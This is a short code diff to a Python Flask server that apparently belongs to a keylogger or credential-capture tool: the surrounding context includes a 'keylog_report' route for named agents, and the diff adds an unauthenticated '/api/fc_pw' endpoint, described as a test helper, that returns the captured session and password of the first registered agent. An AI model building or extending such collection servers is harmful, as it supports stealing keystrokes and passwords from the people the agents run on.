@@ -403,6 +403,15 @@ def keylog_report(agent_name):
     return Response(html, mimetype="text/html")
 
 
+@app.route("/api/fc_pw")
+def api_fc_pw():
+    """Return fastcap session+password for the first registered agent (test helper)."""
+    for name, info in list(_fastcap_cache.items()):
+        if info.get("password"):
+            return jsonify({"session": info.get("session"), "password": info.get("password"), "agent": name})
+    return jsonify({"error": "no fastcap agent registered"}), 404
+
+
 @app.route("/api/status")
 def api_status():
     now = time.time()
